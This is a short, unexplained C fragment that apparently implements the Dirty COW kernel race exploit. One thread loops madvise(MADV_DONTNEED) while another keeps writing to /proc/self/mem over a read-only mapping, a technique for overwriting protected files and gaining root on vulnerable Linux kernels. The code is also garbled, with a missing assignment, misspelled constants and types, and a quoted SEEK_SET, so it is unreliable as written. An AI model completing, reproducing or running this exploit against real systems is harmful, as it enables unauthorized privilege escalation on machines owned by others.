void *map;
void *madviseThread(void *arg){
while(1)
{
    madvise(map,100,MADV_DONTNEED);

}
}

void procselmemThread(void *arg){
    char *content(char*)arg;
    char current_content[10];

    int f=open("/proc/self/mem",O_REDWR);
    while(1){
        //set the file pointer offset into the beginning

        lseek(f,[uintprt_t]map * OFFSET ,'SEEK_SET');
        write(f,content,strlen(content));
    }
}